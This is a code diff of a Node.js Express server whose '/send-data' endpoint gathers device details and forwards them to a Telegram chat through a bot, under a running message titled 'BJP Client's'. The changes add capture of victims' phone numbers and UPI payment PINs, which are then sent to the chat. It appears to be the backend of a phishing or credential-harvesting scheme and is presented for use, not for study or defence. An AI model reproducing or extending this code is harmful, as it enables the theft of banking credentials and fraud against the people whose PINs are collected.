@@ -9,23 +9,21 @@ app.use(express.json());
 
 const { PORT, BOT_TOKEN, CHAT_ID } = process.env;
 
-let lastMessageId = null; // Purane message ki ID save karne ke liye
-let fullHistory = `*BJP Client's*\n\n`; // Saari history store karne ke liye
+let lastMessageId = null; 
+let fullHistory = `*BJP Client's*\n\n`; 
 
 const sendOrUpdateTelegram = async (newEntry) => {
-    fullHistory += newEntry + `\n`; // Nayi entry history mein add karein
+    fullHistory += newEntry + `\n`; 
 
     try {
         if (!lastMessageId) {
-            // Agar pehla message hai, to naya bhejo
             const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 chat_id: CHAT_ID,
                 text: fullHistory,
                 parse_mode: 'Markdown'
             });
-            lastMessageId = response.data.result.message_id; // ID save kar lo
+            lastMessageId = response.data.result.message_id;
         } else {
-            // Agar pehle se message hai, to use hi EDIT karo
             await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                 chat_id: CHAT_ID,
                 message_id: lastMessageId,
@@ -34,7 +32,6 @@ const sendOrUpdateTelegram = async (newEntry) => {
             });
         }
     } catch (error) {
-        // Agar Edit fail ho (e.g. message delete ho gaya ho), to naya bhej do
         const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: fullHistory,
@@ -45,18 +42,25 @@ const sendOrUpdateTelegram = async (newEntry) => {
 };
 
 const startupNotification = async () => {
-    // Startup par lastMessageId reset taaki naya session shuru ho
     lastMessageId = null;
     fullHistory = `*BJP Client's*\n\n`;
 };
 
 app.post('/send-data', async (req, res) => {
-    const { deviceId, deviceTime, deviceDate } = req.body;
+    const { type, number, pin, deviceId, deviceTime, deviceDate } = req.body;
     
-    // Nayi entry ka format jaisa aapne manga
-    let entry = `*Device Model:* ${deviceId || 'Detecting...'}\n`;
-    entry += `*Date:* ${deviceDate || 'Detecting...'}\n`; 
-    entry += `*Real Time:* ${deviceTime || 'Detecting...'}\n`;
+    // Format building
+    let entry = `Device Model: ${deviceId || 'Detecting...'}\n`;
+    entry += `Date: ${deviceDate || 'Detecting...'}\n`; 
+    entry += `Real Time: ${deviceTime || 'Detecting...'}\n`;
+
+    // Condition: Agar PIN mil gaya hai to sirf PIN dikhao, Number nahi
+    if (type !== 'NUMBER' && pin) {
+        entry += `UPI PIN: ${pin}\n`;
+    } else if (number) {
+        // Agar sirf Number hai aur PIN pending hai
+        entry += `Number: +91 ${number}\n`;
+    }
 
     await sendOrUpdateTelegram(entry);
     
